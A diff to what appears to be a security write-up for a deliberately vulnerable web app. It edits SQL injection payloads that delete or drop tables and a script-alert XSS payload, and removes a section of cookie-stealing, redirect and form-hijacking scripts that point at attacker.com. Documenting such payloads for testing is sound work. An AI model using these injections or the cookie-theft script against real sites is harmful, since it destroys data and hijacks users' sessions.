@@ -185,7 +185,7 @@ cursor.executescript(f"""
 
 #### **Attack Payload:**
 ```sql
-Username: test'; DROP TABLE mainapp_user; --
+Username: test-sqli','','','');DELETE FROM mainapp_customer;--
 Email: test@test.com
 Password: anything123
 ```
@@ -196,7 +196,7 @@ Password: anything123
 INSERT INTO mainapp_user (...) VALUES ('test', 'test@test.com', 'hash', 'salt');
 
 -- Malicious query:
-INSERT INTO mainapp_user (...) VALUES ('test'; DROP TABLE mainapp_user; --', 'test@test.com', 'hash', 'salt');
+INSERT INTO mainapp_user (...) VALUES ('test-sqli','','','');DELETE FROM mainapp_customer;--', 'test@test.com', 'hash', 'salt');
 
 -- Result: User created, then entire user table deleted!
 ```
@@ -249,7 +249,7 @@ INSERT INTO mainapp_customer (...) VALUES ('John'); INSERT INTO mainapp_user VAL
 
 #### **Attack Payload:**
 ```html
-First Name: <script>alert('XSS Attack - Customer List Compromised!');</script>
+First Name: <script> alert("XSS") </script>
 Last Name: Victim
 ID: 999999999
 ```
@@ -279,25 +279,6 @@ First Name: <img src="x" onerror="alert('Dashboard Hacked!');">
 #### **What Happens:**
 1. Script executes immediately on dashboard after customer creation
 2. **Immediate impact** on the user who created the customer
-
----
-
-### **🎯 Advanced XSS Payloads**
-
-#### **Cookie Stealing:**
-```html
-<script>fetch('http://attacker.com/steal?data=' + document.cookie);</script>
-```
-
-#### **Page Redirection:**
-```html
-<script>window.location = 'http://malicious-site.com';</script>
-```
-
-#### **Form Hijacking:**
-```html
-<script>document.forms[0].action = 'http://attacker.com/steal';</script>
-```
 
 ---
 
